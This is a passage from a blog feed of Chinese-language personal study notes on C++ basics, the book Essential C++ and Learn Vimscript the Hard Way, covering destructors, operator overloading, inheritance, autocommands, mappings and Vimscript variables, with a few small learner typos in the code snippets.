m_score(score)&#123;...&#125;</code></pre><p>使用构造函数列表仅仅是书写方便。</p><p>初始化const成员变量的唯一方法是使用初始化列表。</p><h3 id="析构函数"><a href="#析构函数" class="headerlink" title="析构函数"></a>析构函数</h3><p>destructor，一种特殊的成员函数，没有返回值，<mark>在销毁对象时自动执行。</mark></p><p>析构函数的名字是在类名前面加一个<code>~</code>符号。</p><p>析构函数没有参数，不能被重载，，因此一个类只能有一个析构函数。</p><p><mark>C中的<code>malloc()和free()</code>与C++中的<code>new()和delete()</code>的区别</mark><br>用new分配内存时会调用构造函数，用delete释放内存时会调用析构函数。</p><p>创建于堆区的对象需要手动delete，</p><hr><p><a href="https://blog.csdn.net/love9099/article/details/43086945?utm_source=app&app_version=5.4.0">参考</a></p><hr><p>析构函数，如果我们不自己写，编译器会自动生成一个，但什么都不会干。</p><p>全局区的对象在程序一开始创建，程序结束时才会被销毁。栈区的对象在调用函数时才创建，在函数结束时销毁，在堆中开辟空间创建的对象必须手动delete。</p><h2 id="2-11"><a href="#2-11" class="headerlink" title="2.11"></a>2.11</h2><h3 id="C-this指针"><a href="#C-this指针" class="headerlink" title="C++ this指针"></a>C++ this指针</h3><p><code>this</code>是C++关键字，代表一个const指针，指向当前对象，可以通过它访问对象的成员。</p><p><code>this</code>只能用在类内部，通过<code>this</code>可以访问类的所有成员，包括public，protected，private。</p><hr><p><a href="https://blog.csdn.net/liitdar/article/details/80654324?utm_source=app&app_version=5.4.0">参考</a></p><hr><h2 id="重载运算符-operator"><a href="#重载运算符-operator" class="headerlink" title="重载运算符 operator"></a>重载运算符 operator</h2><p>关键字<code>operator</code>，重载操作符。</p><p>和运算符如<code>=</code>一起使用。</p><p>用来重载一个运算符，运算符就是&lt; , &gt;, &#x3D;, 这一类。让它可以作用于类上。</p><p>例子：</p><pre><code class="hljs">bool operator= (int value) &#123;. . .&#125;</code></pre><p>和定义函数一样，前面的<code>bool</code>是返回值类型，<code>operator=</code>相当于函数名，<code>(int value)</code>是参数列表，<code>&#123;...&#125;</code>是函数主体。这个就是重载了等号<code>=</code>.</p><p>一个具体的例子：</p><pre><code class="hljs">#   这里operator&gt;为成员函数类懒得写了。bool operator&gt; (int value) &#123;if (this-&gt;own &gt; value)    return ture;else     return false;&#125;int main(void)&#123;    person p1(10);    if (person &gt; 5)        printf(“He has a lot of money!”);    .    .    .&#125;#这里的person会自动调用重载后的&gt;,也就是函数operator&gt;, 然后5就是传入的实参。</code></pre><p>也可以把重载运算符函数声明为非成员函数。</p><p>C++要求，‘&#x3D;’,‘[]’,’()’,’-&gt;’运算符必须被定义为成员函数。</p><p>几点限制：</p><ul><li>实现运算符重载时，需要注意以下几点：</li><li>重载后运算符的操作数至少有一个是用户定义的类型；</li><li>不能违反运算符原来的语法规则；</li><li>不能创建新的运算符；</li><li>有一些运算符是不能重载的，如“sizeof”；</li><li>&#x3D;、()、[]、-&gt; 操作符只能被类的成员函数重载。</li></ul><hr><h2 id="4-1"><a href="#4-1" class="headerlink" title="4.1"></a>4.1</h2><h3 id="C-继承和派生"><a href="#C-继承和派生" class="headerlink" title="C++继承和派生"></a>C++继承和派生</h3><p>继承, inheritance, 就是一个类从另一个类中获取成员函数和成员变量。</p><p>派生, derive, 和继承是一个概念。</p><p>父类和子类一般搭配称呼。</p><p>基类和派生类一般搭配称呼。</p><p>派生类可以定义自己的新成员。</p><p>语法格式：</p><pre><code class="hljs">class Student: public People &#123;. . .&#125;</code></pre><h4 id="三种继承方式"><a href="#三种继承方式" class="headerlink" title="三种继承方式"></a>三种继承方式</h4><p>有三种继承方式，public，private，protected，默认为private。</p><p>类成员访问权限的高低：<br>public &amp;rarr; protected &amp;rarr; private</p><p>protected的变量可以在派生类中使用。</p><p>继承方式中的public，protected，private是指明基类成员在派生类中的<mark>最高访问权限</mark>。</p><p><mark>protected</mark>的成员也不能通过对象访问。</p><p>实际开发中一般使用<code>public</code></p><p>在派生中访问基类的private成员的唯一方法就是借助基类的非private的成员函数。</p><h4 id="改变权限"><a href="#改变权限" class="headerlink" title="改变权限"></a>改变权限</h4><p>可以使用<code>using</code>改变权限。</p><h3 id="C-继承时名字遮蔽问题"><a href="#C-继承时名字遮蔽问题" class="headerlink" title="C++继承时名字遮蔽问题"></a>C++继承时名字遮蔽问题</h3><p>如果派生类中的成员和基类中的成员重名，那么就会遮蔽从基类继承过来的成员。</p><p>此时访问基类的成员就要使用类名和域解析符<code>::</code>。</p><p>基类成员函数和派生类成员函数不构成<mark>重载</mark>.</p><h2 id="5-1"><a href="#5-1" class="headerlink" title="5.1"></a>5.1</h2><h3 id="C-多态和虚函数"><a href="#C-多态和虚函数" class="headerlink" title="C++多态和虚函数"></a>C++多态和虚函数</h3><p>基类的指针只能用来访问派生类的成员变量，但不能访问派生类的成员函数。</p><p>为了让基类指针能够访问派生类的成员函数，C++新增了虚函数，vitual function。</p><p>关键词<code>virtual</code>.</p><p>有了虚函数之后，基类指针指向基类对象时就能使用基类的成员，指向派生类时就能够使用派生类的成员。</p><p>换句话说，基类指针既能够按照基类的方式做事，又能够按照派生类的方式来做事，它有多种形态，或者说多种表现方式，我们将这种现象称为<mark>多态，Polymorphism</mark>。</p><p>也就是虚函数是实现多态的一种方式。</p><p>多态是<mark>面向对象编程</mark>的主要特征之一.</p>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Essential C++ Notes</title>
    <link href="/2022/08/25/Essential%20C++%20Notes/"/>
    <url>/2022/08/25/Essential%20C++%20Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="2022-x2F-5-x2F-28"><a href="#2022-x2F-5-x2F-28" class="headerlink" title="2022&#x2F;5&#x2F;28"></a>2022&#x2F;5&#x2F;28</h1><h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><h3 id="p1-p34"><a href="#p1-p34" class="headerlink" title="p1~p34"></a>p1~p34</h3><p>布尔值(Boolean).</p><p><mark>命名空间</mark><br>是一种将库名称封装起来的方法。</p><p>为什么<code>string class</code>采用erase()而非delete()来表示“删去一个字符”的原因。是因为delete是常用语言。</p><h4 id="另外一种不同的初始化语法"><a href="#另外一种不同的初始化语法" class="headerlink" title="另外一种不同的初始化语法"></a>另外一种不同的初始化语法</h4><p>构造函数语法(constructor syntax):</p><pre><code class="hljs">int num_tries(0);</code></pre><p>其目的是处理需要多值初始化的对象。</p><h4 id="array和vector"><a href="#array和vector" class="headerlink" title="array和vector"></a>array和vector</h4><p>array的大小必须是常值表达式，即不需要在运行时求值的表达式。</p><p>a+b这种算求值，而a不算。</p><p>array是内置的，不需要包含头文件，使用vector要包含<code>#include &lt;vector.h&gt;</code>头文件。</p><hr><h4 id="tamplate-class和class-tamplate"><a href="#tamplate-class和class-tamplate" class="headerlink" title="tamplate class和class tamplate"></a>tamplate class和class tamplate</h4><pre><code class="hljs">tamplate &lt;typename A&gt;   #把A变为模版</code></pre><p>A可以为任意类型。你用int，A救会变成int。</p><hr><p>vector不支持初始化列表的方式。</p><p>vector知道自己的大小。</p><pre><code class="hljs">cout &lt;&lt; elem_seq.size()</code></pre><p>在使用指针时，必须先确定它的确只想某个对象。</p><p>检验指针是否位null：</p><pre><code class="hljs">if (!pi)</code></pre><p>任何指针都可以被初始化为零。</p><p>rand()和srand()函数位于cstdlib头文件中。</p><p><code>.</code>dot，成员选择符和 <code>-&gt;</code>arrow，成员选择符</p><p>Standard Template Library, STL.</p><h4 id="文件的读写"><a href="#文件的读写" class="headerlink" title="文件的读写"></a>文件的读写</h4><p>fstream头文件。</p><p>打开可供输出的文件，定义一个ofstream对象。</p><p>打开文件名和打开模式。</p><p><mark>cerr和cout的区别</mark><br>cerr无缓冲。</p><p><mark>endl操作符</mark><br>插入一个换行符，清除输出缓冲区。</p><p>打开一个读文件，定义ifstream对象。</p><p>同时读写一个文件，定义一个fstream文件，并传入<code>ios_base::in|ios_base::app</code>参数。</p><p><mark>C++头文件</mark><br>使用<code>#include</code>时没有<code>.h</code>后缀。</p><p>打开文件时注意检查是否成功打开。</p><h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h3 id="p35～"><a href="#p35～" class="headerlink" title="p35～"></a>p35～</h3><p>使用<code>cstdlib</code>中的<code>exit()</code>函数终止程序。</p><h4 id="引用和指针的区别"><a href="#引用和指针的区别" class="headerlink" title="引用和指针的区别"></a>引用和指针的区别</h4><p><mark>引用的本质</mark><br>就是一个指针常量。指向不可以改动，但指向的值可以改动。</p><hr><p>隐式退出点，没有<code>return</code>语句时，位于最后一条语句之后。</p><h4 id="动态内存管理"><a href="#动态内存管理" class="headerlink" title="动态内存管理"></a>动态内存管理</h4><p>分配用<code>new</code>释放用<code>delete</code></p><pre><code class="hljs">new Type(initial_value);int *pi;pi = new int;delete pi;</code></pre><p>C++没有提供任何语法让我们得以从heap分配数组的同时为其元素设定初值。</p><p>释放数组有所不同:</p><pre><code class="hljs">delete [] pia;</code></pre><h4 id="提供默认参数值"><a href="#提供默认参数值" class="headerlink" title="提供默认参数值"></a>提供默认参数值</h4><p>C++允许我们为全部或部分参数设定默认值。如：</p><pre><code class="hljs">void display(ostream &amp;os = cout)</code></pre><p><mark>cout和cin</mark>都是文件。</p><p>有两个规则：</p><ol><li>默认值的解析是从右侧开始的，如果我们为某个参数提供了默认值，那么这一参数右侧的所有参数都必须也具有默认值。</li><li>默认值只能指定一次，在声明处或定义处。常放在声明处。</li></ol><h4 id="局部静态对象"><a href="#局部静态对象" class="headerlink" title="局部静态对象"></a>局部静态对象</h4><p>使用<code>static</code>关键词。</p><p><code>push_back</code>会把数值放在vector末端。</p><h4 id="声明inline函数"><a href="#声明inline函数" class="headerlink" title="声明inline函数"></a>声明inline函数</h4><p>将函数声明为<code>inline</code>，表示要求编译器在每个函数的调用点上，将函数的内容展开。<br>如：</p><pre><code class="hljs">inline bool fibon_elem(int pos, int &amp;elem)&#123;...&#125;</code></pre><p><code>inline</code>只是一种请求。</p><p>一般，体积小，常调用的函数被声明为<code>inline</code>.</p><h4 id="提供重载函数"><a href="#提供重载函数" class="headerlink" title="提供重载函数"></a>提供重载函数</h4><p>函数重载机制(function overloading)<br>函数的参数列表不同，可以有相同的名称。但无法根据返回值判断。</p><p>函数模版机制(function tamplate)</p><pre><code class="hljs">template &lt;typename elemType&gt;Void display_message(const string &amp;msg, const vector&lt;elemType&gt; &amp;It);</code></pre><h4 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h4><p>pointer to function,<br>如：</p><pre><code class="hljs">const vector&lt;int&gt;* (*seq_ptr)(int);</code></pre><p>函数的名称就是函数的地址。</p><h4 id="枚举类型"><a href="#枚举类型" class="headerlink" title="枚举类型"></a>枚举类型</h4><p>enumerate type，<code>enum</code>关键字。</p><p>默认情况下，第一个枚举值为0，接下来为1，以此类推。<br>如：</p><pre><code class="hljs">enum color&#123;red, blue, greenYellow, grey&#125;;  #red值为1</code></pre><p>可用枚举类型作为索引值。</p><h4 id="设定头文件"><a href="#设定头文件" class="headerlink" title="设定头文件"></a>设定头文件</h4><p>头文件一般不包含函数的定义，incline函数除外。</p><p>为了扩展incline函数，编译器在每个调用点上，都要取其定义。</p><p><code>extern</code></p><h4 id="泛型编程风格"><a href="#泛型编程风格" class="headerlink" title="泛型编程风格"></a>泛型编程风格</h4>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Learn Vimscript the Hard Way Notes</title>
    <link href="/2022/08/25/Learn%20Vimscript%20the%20Hard%20Way%20Notes/"/>
    <url>/2022/08/25/Learn%20Vimscript%20the%20Hard%20Way%20Notes/</url>
    
    <content type="html"><![CDATA[<p><a href="https://learnvimscriptthehardway.stevelosh.com/">learn vimscrip the hard way</a></p><hr><h1 id="第二次阅读"><a href="#第二次阅读" class="headerlink" title="第二次阅读"></a>第二次阅读</h1><h2 id="14-Autocommand-Groups"><a href="#14-Autocommand-Groups" class="headerlink" title="14 Autocommand Groups"></a>14 Autocommand Groups</h2><p>需要用 <code>augroup</code> 包裹. 对同一个组多次使用 <code>augroup</code> 其会叠加.</p><p>用 <code>augroup</code> 可能是方便组织.<br>如:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">augroup</span> testgroup<br>    <span class="hljs-keyword">autocmd</span> BufWrite * :<span class="hljs-keyword">echom</span> <span class="hljs-string">&quot;cat&quot;</span><br><span class="hljs-keyword">augroup</span> END<br><br><span class="hljs-keyword">augroup</span> testgroup<br>    <span class="hljs-keyword">autocmd</span> BufWrite * :<span class="hljs-keyword">echom</span> <span class="hljs-string">&quot;dog&quot;</span><br><span class="hljs-keyword">augroup</span> END<br></code></pre></td></tr></table></figure><p>要想重写则使用 <code>autocmd!</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">augroup</span> testgroup<br>    autocmd!<br>    <span class="hljs-keyword">autocmd</span> BufWrite * :<span class="hljs-keyword">echom</span> <span class="hljs-string">&quot;dog&quot;</span><br><span class="hljs-keyword">augroup</span> END<br></code></pre></td></tr></table></figure><p>针对某种文件:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">augroup</span> filetype_html<br>    autocmd!<br>    <span class="hljs-keyword">autocmd</span> FileType html <span class="hljs-keyword">nnoremap</span> <span class="hljs-symbol">&lt;buffer&gt;</span> <span class="hljs-symbol">&lt;localleader&gt;</span><span class="hljs-keyword">f</span> Vatzf<br></code></pre></td></tr></table></figure><h2 id="40-Paths"><a href="#40-Paths" class="headerlink" title="40 Paths"></a>40 Paths</h2><h3 id="40-1-Absolute-Paths"><a href="#40-1-Absolute-Paths" class="headerlink" title="40.1 Absolute Paths"></a>40.1 Absolute Paths</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">echo</span> <span class="hljs-built_in">expand</span>(<span class="hljs-string">&#x27;%&#x27;</span>)<br></code></pre></td></tr></table></figure><p>输出当前文件名.</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">echo</span> <span class="hljs-built_in">expand</span>(<span class="hljs-string">&#x27;%:p&#x27;</span>)<br></code></pre></td></tr></table></figure><p>输出当前路径。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">echo</span> <span class="hljs-built_in">fnamemodify</span>(<span class="hljs-string">&#x27;foo.txt&#x27;</span>, <span class="hljs-string">&#x27;:p&#x27;</span>)<br></code></pre></td></tr></table></figure><p>指定当前目录下的一个文件名 (不管是否存在)，显示他的绝对路径.</p><h3 id="40-2-Listing-Files"><a href="#40-2-Listing-Files" class="headerlink" title="40.2 Listing Files"></a>40.2 Listing Files</h3><p>列出当前目录下的所有文件名.</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">echo</span> <span class="hljs-built_in">globpath</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>)<br></code></pre></td></tr></table></figure><p>其返回的是一个 <code>string</code>, 每名字之间用换行符分隔. 为了提取出来，使用 <code>split()</code> 函数:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">echo</span> <span class="hljs-keyword">split</span>(<span class="hljs-built_in">globpath</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>), <span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure><p><code>split()</code> 函数接受两个参数，第一个是一个 <code>string</code>, 第二个是分隔符.</p><h1 id="第一次阅读"><a href="#第一次阅读" class="headerlink" title="第一次阅读"></a>第一次阅读</h1><h2 id="1-Echoing-Messages"><a href="#1-Echoing-Messages" class="headerlink" title="1 Echoing Messages"></a>1 Echoing Messages</h2><p><code>:echo</code>和<code>:echom</code>的区别，后者的信息能被<code>:message</code>保存.</p><h2 id="2-Setting-Options"><a href="#2-Setting-Options" class="headerlink" title="2 Setting Options"></a>2 Setting Options</h2><p><code>?</code>可用来检查状态，如：</p><pre><code class="hljs">:set number?#若没有设置行号，则显示nonumber</code></pre><h2 id="5-Strict-Mapping"><a href="#5-Strict-Mapping" class="headerlink" title="5 Strict Mapping"></a>5 Strict Mapping</h2><p><code>&lt;cr&gt;</code>表示回车键。<br><code>:nunmap /</code>取消<code>/</code>的map。</p><p><mark>Norecursive Mapping</mark><br>就是不会递归替换。<br><code>:*noremap</code>.</p><h2 id="6-2-Leader"><a href="#6-2-Leader" class="headerlink" title="6.2 Leader"></a>6.2 Leader</h2><p>前缀prefix在这里常叫<code>leader</code><br>改变leader：</p><pre><code class="hljs">:let mapleader = “-”#然后执行:nnoremap &lt;leader&gt;d dd#此时-d代表dd </code></pre><p>感觉这像是一种约定俗成，而且便于修改你方便的前缀。</p><p>另一个可以用在特定文件的leader叫“local leader”，设置如下：</p><pre><code class="hljs">:let maplocalleader = “\\”</code></pre><h1 id="2022-x2F-5-x2F-31"><a href="#2022-x2F-5-x2F-31" class="headerlink" title="2022&#x2F;5&#x2F;31"></a>2022&#x2F;5&#x2F;31</h1><h2 id="8-Abbreviations"><a href="#8-Abbreviations" class="headerlink" title="8 Abbreviations"></a>8 Abbreviations</h2><Keyword Characters>The abbreviation will be expanded when you type anything that’s not a letter, number, or underscore.<p>使用<code>:set iskeyword?</code>查看哪些是<code>keyword</code>,也就是不会被缩写abbreviation展开的字符。</p><p>Abbreviation 可以用来correcting typos。</p><h3 id="Abbreviation-和-mapping的区别"><a href="#Abbreviation-和-mapping的区别" class="headerlink" title="Abbreviation 和 mapping的区别"></a>Abbreviation 和 mapping的区别</h3><p>mapping会立即扩展，而abbreviation需要后面跟一个空格才会扩展。</p><h2 id="9-More-Mapping"><a href="#9-More-Mapping" class="headerlink" title="9 More Mapping"></a>9 More Mapping</h2><p>按下<code>viw</code>可以在可视模式下选中一个单词。</p><p>普通模式下<code>w</code>是光标移动到一个单词的末尾，<code>b</code>是移动到一个单词的开头。</p><h1 id="2022-x2F-6-x2F-1"><a href="#2022-x2F-6-x2F-1" class="headerlink" title="2022&#x2F;6&#x2F;1"></a>2022&#x2F;6&#x2F;1</h1><h2 id="11-Buffer-Local-Options"><a href="#11-Buffer-Local-Options" class="headerlink" title="11 Buffer-Local Options"></a>11 Buffer-Local Options</h2><p><code>&lt;buffer&gt;</code>, 告诉vim在当前缓冲区内使用次此命令。</p><pre><code class="hljs">:nnoremap &lt;buffer&gt; &lt;leader&gt;x dd</code></pre><h3 id="Local-Leader"><a href="#Local-Leader" class="headerlink" title="Local Leader"></a>Local Leader</h3><p>When you create mapping that only applies to specific buffers you should use <local leader>    instead of <leader>.</p><h3 id="setting"><a href="#setting" class="headerlink" title="setting"></a>setting</h3><p><code>:setlocal</code> 作用于当前缓冲区。</p><p><code>:set</code>设置的是全局值。</p><p>一个window就是一个buffer。</p><p><code>:setglobal</code>,设置全局值，但不改变当前buffer的变量。</p><h1 id="2022-x2F-6-x2F-2"><a href="#2022-x2F-6-x2F-2" class="headerlink" title="2022&#x2F;6&#x2F;2"></a>2022&#x2F;6&#x2F;2</h1><h2 id="12-Autocommand"><a href="#12-Autocommand" class="headerlink" title="12 Autocommand"></a>12 Autocommand</h2><hr><p><a href="https://blog.csdn.net/qq_42239765/article/details/111847523">参考1</a></p><hr><p><code>autocmd</code>即自动命令，是在指定事件发生时自动执行的命令。</p><p>格式大概是：</p><pre><code class="hljs">:autocmd event filter command如:autocmd BufNewFile * :write</code></pre><p><code>:w</code>是<code>:write</code>的缩写，意为将当前缓冲区的内容写入文件。</p><pre><code class="hljs">:normal gg=G</code></pre><p>会告诉Vim to reindent the current file</p><p>The event type BufWritePre means the event will be checked just before you write any file.</p><p>所以说，event可能就是，检查的时机，后面的filter就是检查的对象。</p><p>查看有哪些<code>autocmd</code>的events</p><pre><code class="hljs">:help autocmd-events</code></pre><p><mark>Multiple Events</mark></p><pre><code class="hljs">:autocmd BufWritePre,BufRead *.html :normal gg=G</code></pre><p>一般把<code>BufRead</code>和<code>BufNewFile</code>两个events添加到一起。逗号连接时不能有空格。</p><pre><code class="hljs">:autocmd BufNewFile, BufRead *.html setlocal nowrap</code></pre><p><mark>FileType Events</mark><br>最常用的就是<code>FileType</code>这个events。<br>如</p><pre><code class="hljs">:autocmd FileType JavaScript nnoremap &lt;buffer&gt; &lt;localleader&gt;c I//&lt;esc&gt;</code></pre><p>将autocommand和buffer local mapping结合，可以创建特定的键位。</p><p><mark>自动折行</mark></p><pre><code class="hljs">:set wrap</code></pre><p>就是把长的一行用多行显示。</p><pre><code class="hljs">:set textwidth=n</code></pre><p>每行超过n各字符时自动换行。</p><h2 id="13-Buffer-local-Abbreviations"><a href="#13-Buffer-local-Abbreviations" class="headerlink" title="13 Buffer-local Abbreviations"></a>13 Buffer-local Abbreviations</h2><p>在<code>:iabbrev</code>中使用<code>&lt;buffer&gt;</code>.</p><p><code>&lt;left&gt;</code>即向左移动一个字符。</p><h3 id="autocmd-events-的几个前缀和后缀"><a href="#autocmd-events-的几个前缀和后缀" class="headerlink" title="autocmd-events 的几个前缀和后缀"></a>autocmd-events 的几个前缀和后缀</h3><p><code>Buf</code>都作为前缀，是与buffer相关的，如<code>BufNewFile</code>，就是在打开一个不存在的文件时触发。</p><p><code>Pre</code>都作为后缀， 意为在什么之前，如<code>BufReadPre</code>，就是在打开一个buffer后，在读文件之前触发。</p><p><code>Post</code>都作为后缀，意为在什么之后，如<code>BufReadPost</code>，就是在打开一个buffer后，在读文件之后触发。</p><p><code>Read</code>和<code>Write</code>一般是命令中间。</p><p><code>File</code>，与文件相关，如<code>FileType</code>。</p><p><code>Filter</code>与filter命令相关，如<code>FilterReadPre</code>。</p><h2 id="过滤器filter"><a href="#过滤器filter" class="headerlink" title="过滤器filter"></a>过滤器filter</h2><hr><p><a href="https://zhuanlan.zhihu.com/p/130983572">参考</a></p><hr><h2 id="14-Autocommand-Groups-1"><a href="#14-Autocommand-Groups-1" class="headerlink" title="14 Autocommand Groups"></a>14 Autocommand Groups</h2><p>作用，防止重复定义。</p><pre><code class="hljs">autocmd!</code></pre><p>能够clear前面相同的定义。</p><p>Read <code>:help autocmd-groups </code></p><h2 id="15-Operator-Pending-Mappings"><a href="#15-Operator-Pending-Mappings" class="headerlink" title="15 Operator-Pending Mappings"></a>15 Operator-Pending Mappings</h2><pre><code class="hljs">:onoremap p i(</code></pre><p>这里的第一个<code>o</code>就是<code>operator</code>的意思。<br>此时用<code>dp</code>结果就是删除括号里面的。<br>用在等待一个动作时。</p><p>think way：</p><ol><li>Start at the cursor position</li><li>Enter visual mode(charwise)</li><li>…mapping keys go here…</li><li>Alll the text you want to include in the movement should now be selected.</li></ol><p>Read <code>:help omap-info</code></p><h2 id="16-More-Operator-Pending-Mappings"><a href="#16-More-Operator-Pending-Mappings" class="headerlink" title="16 More Operator-Pending Mappings"></a>16 More Operator-Pending Mappings</h2><h3 id="normal命令"><a href="#normal命令" class="headerlink" title="normal命令"></a>normal命令</h3><pre><code class="hljs">:normal</code></pre><p>命令。</p><pre><code class="hljs">:normal gg</code></pre><p>就是跳转到开头，所以，<code>normal</code>命令就是指在<code>:normal</code>模式下运行命令。</p><h3 id="execute命令"><a href="#execute命令" class="headerlink" title="execute命令"></a>execute命令</h3><pre><code class="hljs">:execute “write”</code></pre><p>就是执行一段Vimscript命令。</p><h4 id="g"><a href="#g" class="headerlink" title="g_"></a>g_</h4><p>移动到the last non-blank character in the line.</p><hr><p>Read <code>:help pattern-overview</code><br>Read <code>:help normal</code><br>Read <code>:help execute</code><br>Read <code>:help expr-quote</code></p><h2 id="17-Status-Lines"><a href="#17-Status-Lines" class="headerlink" title="17 Status Lines"></a>17 Status Lines</h2><p>就是页面最下面那一行，可以改变输出的内容。</p><pre><code class="hljs">:set statusline=%f</code></pre><p>Things that start with % are expanded to different text depending on what comes after them.</p><p>空白字符需转义。</p><pre><code class="hljs">:set statusline=%f\ -\ FileType:\ %y</code></pre><p>在当前的statusline后面添加：</p><pre><code class="hljs">:set statusline+=FileType</code></pre><p>查阅</p><pre><code class="hljs">:help statusline</code></pre><h2 id="18-Responsible-Coding"><a href="#18-Responsible-Coding" class="headerlink" title="18 Responsible Coding"></a>18 Responsible Coding</h2><p>在normal模式下Fold you code by</p><pre><code class="hljs">za    </code></pre><h3 id="fold-everything-automatically"><a href="#fold-everything-automatically" class="headerlink" title="fold everything automatically"></a>fold everything automatically</h3><pre><code class="hljs">:help foldlevelstart</code></pre><p>设置<code>foldlevel</code>的值来决定fold。</p><p>一般情况：</p><pre><code class="hljs">set foldlevel=</code></pre><p>放在autocmd前面，以便修改不同类型文件的foldlevel。</p><h2 id="19-Variables"><a href="#19-Variables" class="headerlink" title="19 Variables"></a>19 Variables</h2><p><code>set</code>和<code>let</code>的区别。</p><hr><p><a href="https://blog.csdn.net/s634772208/article/details/78994790?utm_source=app&app_version=5.5.0">参考</a></p><hr><p>这里可能要区分选项options和变量variables。</p><p><code>set</code>只能用与设置选项，且不能进行运算，如</p><pre><code class="hljs">:set textwidth=100+1</code></pre><p>会报错。</p><p><code>let</code>可以用于变量和选项，只不过修改选项时要加上<code>&amp;</code>，如</p><pre><code class="hljs">:let &amp;textwidth=100+1</code></pre><p>修改变量时用<code>&amp;</code>就会报错。</p><p><code>set</code>还能查看选项的值，如</p><pre><code class="hljs">set textwidth?</code></pre><p>以上设置的都是全局的变量和选项。</p><h3 id="Local-Options"><a href="#Local-Options" class="headerlink" title="Local Options"></a>Local Options</h3><pre><code class="hljs">:let &amp;1:number = 1</code></pre><p>报错了。</p><h3 id="Registers-as-Variables"><a href="#Registers-as-Variables" class="headerlink" title="Registers as Variables"></a>Registers as Variables</h3><p>Read and set registers as variables.</p><pre><code class="hljs">:let @a = “hello!”</code></pre><p>把寄存器a的值设置为“hello!”，可以在normal中引用寄存器的值</p><pre><code class="hljs">“ap</code></pre><p>粘贴a的值。</p><p><code>”</code>寄存器，保存上一次复制粘贴的值，如</p><pre><code class="hljs">echo @“</code></pre><p><code>/</code>寄存器，保存上一次查找的值，如</p><pre><code class="hljs">echo @/</code></pre><p>You should never use <code>let</code> if <code>set</code> will suffice.</p><p>Read <code>:help registers</code>.</p><h2 id="Variable-Scoping"><a href="#Variable-Scoping" class="headerlink" title="Variable Scoping"></a>Variable Scoping</h2><p>Like</p><pre><code class="hljs">:let b:hello = “world”</code></pre><p><code>b:</code> is a scope for variables, 表示设置为局部值。</p><p>浏览scopes表<code>:help internal-variables</code></p><h2 id="21-Conditionals"><a href="#21-Conditionals" class="headerlink" title="21 Conditionals"></a>21 Conditionals</h2><h3 id="Multiple-Line-Statements"><a href="#Multiple-Line-Statements" class="headerlink" title="Multiple-Line Statements"></a>Multiple-Line Statements</h3><p>Use <code>|</code> to separate each line</p><pre><code class="hljs">:echom “foo” | echom “bar”</code></pre><h3 id="Basic-if"><a href="#Basic-if" class="headerlink" title="Basic if"></a>Basic if</h3><pre><code class="hljs">:if 1:   echom “ZERO”:endif</code></pre><p>Vimscript中的字符串的值要根据上下文判断。如</p><pre><code class="hljs">if “10” #这里表示数字if “10num” #这里也表示数字if “num10” #这里不是数字了“hello” + 10 #值为10</code></pre><h3 id="else-和-elseif"><a href="#else-和-elseif" class="headerlink" title="else 和 elseif"></a>else 和 elseif</h3><pre><code class="hljs">if  0    echom “if”elseif “nope!”    echom “elseif”else     echom “finally”endif</code></pre><h2 id="22-Comparisons"><a href="#22-Comparisons" class="headerlink" title="22 Comparisons"></a>22 Comparisons</h2><pre><code class="hljs">if 10 &gt; 1    echom “foo”endif</code></pre><h3 id="Case-Sensitivity"><a href="#Case-Sensitivity" class="headerlink" title="Case Sensitivity"></a>Case Sensitivity</h3><pre><code class="hljs">:set noignorecase:set ignorecase</code></pre><p>设置大小写敏感。</p><h3 id="Code-Defensively"><a href="#Code-Defensively" class="headerlink" title="Code Defensively"></a>Code Defensively</h3><p>A bare “&#x3D;&#x3D;” should never appear in your plugins’ code.    </p><p><code>==?</code> case-insensitive no matter what the user has set.</p><p><code>==#</code> case-sensitive no matter what the user has set.</p><p>在数字做比较是也多用上面两个operator。</p><p>Read :help ignorecase<br>Read :help expr4</p><h2 id="23-Functions"><a href="#23-Functions" class="headerlink" title="23 Functions"></a>23 Functions</h2><p>Define the function</p><pre><code class="hljs">function Meow()    echom “Meow!”endfunction</code></pre><p>Running the function</p><pre><code class="hljs">call Meow()</code></pre><p>Returning a value</p><pre><code class="hljs">function GetMeow()    return “Meow String!”endfunction</code></pre><h3 id="Implicit-Returning"><a href="#Implicit-Returning" class="headerlink" title="Implicit Returning"></a>Implicit Returning</h3><p>没有明确的写<code>return</code>的话，会有implicit returning.</p><p>Read <code>:help call</code></p><p>Read <code>:help E124</code> 看那些可以当作函数名。 must start with a capital or “s:”</p><p>Read <code>:help return</code></p><h2 id="24-Function-Arguments"><a 